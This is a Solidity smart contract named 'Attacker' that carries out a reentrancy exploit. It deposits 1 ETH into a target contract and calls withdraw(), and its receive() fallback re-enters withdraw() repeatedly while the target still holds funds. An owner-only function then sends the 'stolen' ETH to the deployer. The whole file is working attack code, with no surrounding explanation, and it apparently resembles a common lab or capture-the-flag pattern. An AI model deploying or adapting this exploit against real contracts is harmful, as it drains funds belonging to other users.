// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerable public vulnerableContract;
    address public owner;
    uint public attackCount;

    constructor(address _vulnerableAddr) {
        vulnerableContract = IVulnerable(_vulnerableAddr);
        owner = msg.sender;
    }

    // Attack starts here
    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }

    // Fallback triggered on receive
    receive() external payable {
        if (address(vulnerableContract).balance >= 1 ether && attackCount < 3) {
            attackCount++;
            vulnerableContract.withdraw();
        }
    }

    // Withdraw stolen ETH
    function getStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
